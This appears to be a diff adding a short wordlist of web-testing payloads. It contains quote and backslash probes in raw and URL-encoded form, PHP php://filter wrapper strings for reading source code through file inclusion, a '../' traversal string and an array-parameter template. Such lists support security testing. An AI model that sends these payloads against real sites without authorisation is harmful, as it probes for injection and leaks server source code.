@@ -1,0 +1,12 @@
+'
+%27
+"
+%22
+\
+%5C
+{PARAM}[]=
+php://filter/string.base64-encode/resource=index
+php://filter/string.rot13/resource=index
+../
+index.php
+
